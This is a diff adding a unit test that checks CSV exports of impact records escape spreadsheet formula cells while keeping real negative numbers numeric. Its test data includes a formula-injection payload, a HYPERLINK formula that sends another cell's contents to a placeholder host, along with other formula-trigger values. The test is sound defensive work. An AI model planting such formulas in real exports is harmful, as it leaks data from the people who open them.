@@ -69,3 +69,21 @@ test('exported impacts carry a salted rider hash, never the uid', () => {
   assert.ok(!row.includes('secret-uid'));
   assert.equal(row.split(',').length, FIELDS.length);
 });
+
+test('CSV exports neutralise cells a spreadsheet would run as a formula', () => {
+  const evil = '=HYPERLINK("https://example.invalid/?"&B3,"details")';
+  const csv = toCsv([{ id: 'c1', label: 'fall', peakG: evil, reason: '+1', surface: '@x', bikeCc: '\t1', severity: '-2+3' }]);
+  const row = csv.split('\n')[1];
+  assert.ok(!/(^|,)"?[=+\-@\t\r]/.test(row), row);
+  assert.match(row, /"'=HYPERLINK\(""https/);
+  assert.match(row, /,'\+1,/);
+  // Real numbers, negative ones included, stay numbers.
+  assert.match(toCsv([{ id: 'c2', peakG: -1.5, speedBeforeKmh: 0 }]), /^c2,,,,-1\.5,0,/m);
+
+  const rec = toRecord('ev-2', 'uid', { peakUserG: evil, rotationDeg: -30, reason: '@SUM(A1)' }, 's');
+  const irow = toCsvRow(rec);
+  assert.ok(!/(^|,)"?[=+@\t\r]/.test(irow), irow);
+  assert.match(irow, /"'=HYPERLINK/);
+  assert.match(irow, /,-30,/);
+  assert.match(irow, /,'@SUM\(A1\),/);
+});
